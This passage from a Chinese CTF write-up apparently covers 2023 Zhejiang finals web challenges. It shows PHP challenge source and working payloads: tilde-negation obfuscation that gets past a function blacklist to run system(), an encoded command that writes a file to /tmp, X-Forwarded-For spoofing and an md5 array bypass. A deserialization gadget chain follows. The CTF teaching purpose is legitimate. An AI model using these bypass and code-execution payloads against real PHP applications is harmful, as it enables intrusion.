class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2096</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$read</span>\n&quot;</span>;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$wh</span>,<span class="hljs-string">&#x27;y&#x27;</span>);<br><br><span class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2048</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;read: &quot;</span>.<span class="hljs-variable">$read</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2048</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$i</span>:<span class="hljs-subst">$read</span>\n&quot;</span>;<br><span class="hljs-variable">$op</span>=<span class="hljs-string">&quot;\$value=&quot;</span>.<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">strtok</span>(<span class="hljs-variable">$read</span>,<span class="hljs-string">&quot; =&quot;</span>)).<span class="hljs-string">&#x27;;&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$op</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$op</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;\n&quot;</span>.<span class="hljs-variable">$op</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$wh</span>,<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$value</span>).PHP_EOL);<br><span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">200</span>)&#123;<br>    <span class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2048</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$i</span>:<span class="hljs-subst">$read</span>\n&quot;</span>;<br>    <span class="hljs-variable">$op</span>=<span class="hljs-string">&quot;\$value=&quot;</span>.<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">strtok</span>(<span class="hljs-variable">$read</span>,<span class="hljs-string">&quot; =&quot;</span>)).<span class="hljs-string">&#x27;;&#x27;</span>;<br><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$op</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$wh</span>,<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$value</span>).PHP_EOL);<br>        <span class="hljs-variable">$i</span>++;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>C%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">92</span>)(~%D7%<span class="hljs-number">9</span>A%<span class="hljs-number">9</span>C%<span class="hljs-number">97</span>%<span class="hljs-number">90</span>%DF%DD%AF%BB%C6%<span class="hljs-number">88</span>%<span class="hljs-number">9</span>E%B7%BE%B1%BC%<span class="hljs-number">98</span>%CF%B4%B5%B8%AD%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>C%CD%B2%C6%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%BB%AE%<span class="hljs-number">90</span>%B5%B2%BB%CF%D4%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%B6%<span class="hljs-number">91</span>%BD%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>C%B8%AA%<span class="hljs-number">96</span>%B3%BC%<span class="hljs-number">9</span>B%<span class="hljs-number">86</span>%B5%<span class="hljs-number">86</span>%<span class="hljs-number">94</span>%<span class="hljs-number">8</span>C%BB%AE%<span class="hljs-number">90</span>%B5%B2%AB%CF%D4%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%B6%<span class="hljs-number">91</span>%BD%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>C%B8%AA%<span class="hljs-number">96</span>%B3%BC%<span class="hljs-number">9</span>B%CC%B5%<span class="hljs-number">86</span>%<span class="hljs-number">94</span>%<span class="hljs-number">8</span>C%BB%AE%<span class="hljs-number">90</span>%B5%B2%<span class="hljs-number">95</span>%CF%D4%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%B6%<span class="hljs-number">92</span>%A5%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>D%B8%AA%<span class="hljs-number">96</span>%B3%BC%B6%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>B%B8%CE%<span class="hljs-number">88</span>%B3%CD%A9%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%C6%<span class="hljs-number">86</span>%B3%A8%C6%CE%<span class="hljs-number">9</span>B%B7%BD%CE%<span class="hljs-number">9</span>B%BC%CA%CF%<span class="hljs-number">9</span>A%B7%AE%<span class="hljs-number">96</span>%B3%BC%<span class="hljs-number">9</span>B%<span class="hljs-number">97</span>%B5%<span class="hljs-number">86</span>%<span class="hljs-number">94</span>%B1%BC%<span class="hljs-number">96</span>%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%A6%AB%CE%<span class="hljs-number">88</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%C6%<span class="hljs-number">95</span>%A7%CD%C6%<span class="hljs-number">88</span>%A5%A8%CB%<span class="hljs-number">90</span>%B6%<span class="hljs-number">96</span>%C6%<span class="hljs-number">86</span>%A5%A8%B9%<span class="hljs-number">94</span>%A5%<span class="hljs-number">92</span>%<span class="hljs-number">87</span>%<span class="hljs-number">97</span>%A5%<span class="hljs-number">86</span>%B6%<span class="hljs-number">8</span>C%B5%B8%AD%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>C%CD%B2%<span class="hljs-number">8</span>C%B5%B8%<span class="hljs-number">97</span>%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">92</span>%AD%<span class="hljs-number">8</span>C%A5%AC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>C%CE%C6%<span class="hljs-number">86</span>%A5%A7%B1%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>B%A7%B5%<span class="hljs-number">95</span>%A5%AC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%A6%AC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>B%CD%<span class="hljs-number">98</span>%C6%B5%B8%<span class="hljs-number">97</span>%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">92</span>%AD%<span class="hljs-number">8</span>C%A5%A9%<span class="hljs-number">8</span>C%<span class="hljs-number">88</span>%A7%AB%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%AD%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%BB%CF%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>E%B8%B9%<span class="hljs-number">8</span>A%A5%B8%<span class="hljs-number">87</span>%<span class="hljs-number">93</span>%A8%<span class="hljs-number">85</span>%B9%<span class="hljs-number">9</span>B%B0%<span class="hljs-number">88</span>%CF%B4%A5%A8%B1%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">86</span>%BE%<span class="hljs-number">96</span>%B5%B7%B5%<span class="hljs-number">90</span>%B6%BC%AD%CC%<span class="hljs-number">9</span>E%BC%BD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%B8%A9%<span class="hljs-number">8</span>A%A7%B8%CB%<span class="hljs-number">96</span>%B0%<span class="hljs-number">88</span>%CF%B4%<span class="hljs-number">9</span>B%<span class="hljs-number">92</span>%B9%<span class="hljs-number">86</span>%A7%CD%AD%CE%<span class="hljs-number">9</span>D%A7%BE%<span class="hljs-number">90</span>%B5%B8%<span class="hljs-number">97</span>%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">92</span>%AD%<span class="hljs-number">8</span>C%A5%AC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%CE%<span class="hljs-number">92</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B2%<span class="hljs-number">95</span>%BE%CA%B1%<span class="hljs-number">96</span>%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%A6%CD%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%B6%BC%B6%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%B9%<span class="hljs-number">87</span>%<span class="hljs-number">8</span>A%B6%<span class="hljs-number">95</span>%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">92</span>%A5%CC%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">93</span>%CF%A5%AC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>B%CD%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B5%CC%<span class="hljs-number">94</span>%<span class="hljs-number">91</span>%B4%AB%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">98</span>%CF%B4%B5%B7%B5%<span class="hljs-number">93</span>%A6%A8%AE%C6%A5%<span class="hljs-number">91</span>%B5%<span class="hljs-number">93</span>%A6%A8%AE%<span class="hljs-number">90</span>%B5%B7%B5%<span class="hljs-number">90</span>%B3%BB%B6%<span class="hljs-number">88</span>%B1%BB%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>F%B0%<span class="hljs-number">88</span>%CF%B4%A5%A8%B1%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">86</span>%BE%<span class="hljs-number">96</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%<span class="hljs-number">96</span>%CB%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%CB%<span class="hljs-number">96</span>%A7%B8%CB%<span class="hljs-number">96</span>%B0%<span class="hljs-number">88</span>%CF%B4%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%CE%<span class="hljs-number">92</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B2%<span class="hljs-number">95</span>%BE%CF%B0%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%A6%CD%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%B6%BC%B6%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>E%AB%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%B9%<span class="hljs-number">87</span>%<span class="hljs-number">8</span>A%B6%<span class="hljs-number">95</span>%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%AD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BB%CF%<span class="hljs-number">96</span>%A7%BC%AD%CD%A6%A8%<span class="hljs-number">87</span>%CE%A5%AB%CF%<span class="hljs-number">96</span>%B3%<span class="hljs-number">91</span>%AD%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%A8%CF%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>C%CC%AD%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>B%B8%C6%<span class="hljs-number">8</span>D%B4%BC%AD%<span class="hljs-number">86</span>%A5%A8%B9%<span class="hljs-number">94</span>%B3%BC%B6%<span class="hljs-number">98</span>%AF%AC%B6%<span class="hljs-number">8</span>F%B4%AC%CB%<span class="hljs-number">91</span>%B0%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>C%C8%BB%AE%<span class="hljs-number">90</span>%B1%BC%<span class="hljs-number">92</span>%A9%<span class="hljs-number">95</span>%<span class="hljs-number">9</span>E%B8%C7%<span class="hljs-number">98</span>%B5%B8%C6%<span class="hljs-number">88</span>%B3%<span class="hljs-number">96</span>%B5%<span class="hljs-number">9</span>C%<span class="hljs-number">9</span>D%<span class="hljs-number">96</span>%B6%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">92</span>%B9%<span class="hljs-number">8</span>C%B4%BC%AD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%A6%CD%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%B6%BC%AD%CD%A6%A8%<span class="hljs-number">87</span>%CE%A5%AC%CB%<span class="hljs-number">96</span>%A7%B8%CB%<span class="hljs-number">96</span>%B3%<span class="hljs-number">96</span>%AD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BC%CB%<span class="hljs-number">96</span>%A7%B8%CB%<span class="hljs-number">96</span>%B0%<span class="hljs-number">88</span>%CF%B4%A5%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%A7%AD%<span class="hljs-number">93</span>%B4%BC%AD%CC%<span class="hljs-number">9</span>E%BC%<span class="hljs-number">87</span>%<span class="hljs-number">85</span>%<span class="hljs-number">9</span>B%B7%B5%CD%A6%A8%<span class="hljs-number">88</span>%<span class="hljs-number">90</span>%B5%B7%A5%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%B7%A9%<span class="hljs-number">93</span>%B4%AC%CA%AE%AC%B9%BD%<span class="hljs-number">99</span>%AD%AA%C6%B2%B4%AB%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%AD%<span class="hljs-number">8</span>F%AF%AB%BE%C8%BB%AE%<span class="hljs-number">8</span>F%CC%<span class="hljs-number">9</span>E%B8%<span class="hljs-number">93</span>%<span class="hljs-number">8</span>C%A5%AC%BE%<span class="hljs-number">90</span>%B5%B8%<span class="hljs-number">94</span>%C7%B2%<span class="hljs-number">95</span>%BE%<span class="hljs-number">88</span>%B4%A7%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%BE%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%CE%<span class="hljs-number">92</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B2%<span class="hljs-number">95</span>%BE%CF%B0%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%A5%A8%B1%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">86</span>%BE%<span class="hljs-number">96</span>%B5%B8%<span class="hljs-number">94</span>%C9%B5%B7%B5%<span class="hljs-number">93</span>%A6%A8%AD%<span class="hljs-number">9</span>C%<span class="hljs-number">9</span>D%<span class="hljs-number">96</span>%B6%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%B5%B8%C6%<span class="hljs-number">88</span>%AF%AC%B5%<span class="hljs-number">9</span>C%B5%B7%A5%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%B7%A9%<span class="hljs-number">93</span>%AF%AC%B6%<span class="hljs-number">8</span>A%<span class="hljs-number">9</span>B%B7%B5%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>D%AC%<span class="hljs-number">97</span>%<span class="hljs-number">85</span>%<span class="hljs-number">9</span>B%B7%B5%CF%<span class="hljs-number">9</span>D%CD%<span class="hljs-number">8</span>C%<span class="hljs-number">90</span>%B5%B7%B5%<span class="hljs-number">93</span>%A6%A8%AE%<span class="hljs-number">8</span>C%B6%<span class="hljs-number">96</span>%BE%C6%B6%<span class="hljs-number">96</span>%<span class="hljs-number">94</span>%<span class="hljs-number">8</span>F%B3%<span class="hljs-number">96</span>%<span class="hljs-number">9</span>C%C8%B5%<span class="hljs-number">85</span>%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%BE%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%B6%BC%BE%B1%BC%<span class="hljs-number">96</span>%BE%<span class="hljs-number">98</span>%B6%BC%BD%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">92</span>%B9%<span class="hljs-number">8</span>C%B4%BC%AD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%A5%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%A7%AD%<span class="hljs-number">93</span>%B4%BC%AD%CC%<span class="hljs-number">9</span>E%BC%<span class="hljs-number">87</span>%<span class="hljs-number">85</span>%<span class="hljs-number">9</span>B%B7%B5%CD%A6%A8%<span class="hljs-number">88</span>%<span class="hljs-number">90</span>%B5%B7%A5%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%B7%A9%<span class="hljs-number">93</span>%B4%AC%CA%AE%AC%B9%BD%<span class="hljs-number">99</span>%AD%AA%C6%B2%B4%AB%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>E%AC%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>D%B0%<span class="hljs-number">88</span>%CF%B4%<span class="hljs-number">99</span>%AE%CF%B4%DD%DF%<span class="hljs-number">83</span>%DF%<span class="hljs-number">9</span>D%<span class="hljs-number">9</span>E%<span class="hljs-number">8</span>C%<span class="hljs-number">9</span>A%C9%CB%DF%D2%<span class="hljs-number">9</span>B%DF%C1%DF%D0%<span class="hljs-number">8</span>B%<span class="hljs-number">92</span>%<span class="hljs-number">8</span>F%D0%<span class="hljs-number">9</span>E%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%D6%DF%D9%D9%DF%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%DF%D0%<span class="hljs-number">8</span>B%<span class="hljs-number">92</span>%<span class="hljs-number">8</span>F%D0%<span class="hljs-number">9</span>E%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F);<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2023/2023zhejiang-4.png"></p><h2 id="决赛-baby-md5"><a href="#决赛-baby-md5" class="headerlink" title="决赛[baby md5]"></a>决赛[baby md5]</h2><p>check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isRequestFromLocal</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// 定义本地IP地址</span><br>    <span class="hljs-variable">$localIP</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><br>    <span class="hljs-comment">// 获取客户端IP地址</span><br>    <span class="hljs-variable">$clientIP</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br><br>    <span class="hljs-comment">// 比较客户端IP地址与本地IP地址</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$clientIP</span> === <span class="hljs-variable">$localIP</span>) &#123;<br>        <span class="hljs-comment">// 请求来自本地</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 请求不来自本地</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;check.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">isRequestFromLocal</span>()) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello!&#x27;</span>;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/eval|shell_exec|system|proc_open|popen|pcntl_exec|\&#x27;|cat|include|whoami/i&quot;</span>,<span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$c</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Oh no, you are hacker!!!&#x27;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;failed&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ip验证用X-Forwarded-For，md5弱比较用数组绕过，正则匹配用取反绕过</p><p>payload：<code>X-Forwarded-For=127.0.0.1</code>,<code>cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);&amp;key1[]=1&amp;key2[]=2</code></p><p><img src="/img/wp/2023/2023zhejiang-5.png"></p><h2 id="决赛-easy-serialize"><a href="#决赛-easy-serialize" class="headerlink" title="决赛[easy serialize]"></a>决赛[easy serialize]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in /flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">baby</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var3</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">learn</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-variable">$key</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAge</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;var2-&gt;var3;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">learn</span>(<span class="hljs-variable">$var</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">learn</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAge</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">young</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">old</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span 